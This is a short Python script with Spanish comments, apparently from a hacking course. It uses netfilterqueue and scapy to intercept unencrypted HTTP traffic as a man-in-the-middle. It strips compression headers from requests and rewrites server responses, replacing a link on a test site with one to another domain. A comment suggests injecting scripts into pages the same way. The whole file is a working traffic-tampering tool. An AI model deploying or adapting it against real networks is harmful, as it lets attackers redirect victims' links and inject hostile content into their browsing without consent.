#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len # para evitar la comprobación de la integridad del paquete
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80:
                print(f"\n[+] Solicitud:\n")
                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load) # para evitar que el servidor responda sin comprimir toda la data
                new_packet = set_load(scapy_packet, modified_load) # paquete modificado
                packet.set_payload(new_packet.build())
            elif scapy_packet[scapy.TCP].sport == 80:
                print(f"\n[+] Respuesta del servidor:\n")
                #modified_load = scapy_packet[scapy.Raw].load.replace(b"Home of Acunetix Art", b"Hacked") # se sustituye una parte del código fuente de la web
                modified_load = scapy_packet[scapy.Raw].load.replace(b'<a href="https://www.acunetix.com/vulnerability-scanner">', b'<a href="https://hack4u.io">') # modificamos un enlace para que lleve al que nosotros queremos
                # Podrías meter un script antes de una etiqueta o cualquier cosa
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())
                print(scapy_packet.show())
        #except Exception as e: # genera ruido
        #    print(f"\n[ERROR]: {e}")
        except:
            pass

    packet.accept()



queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
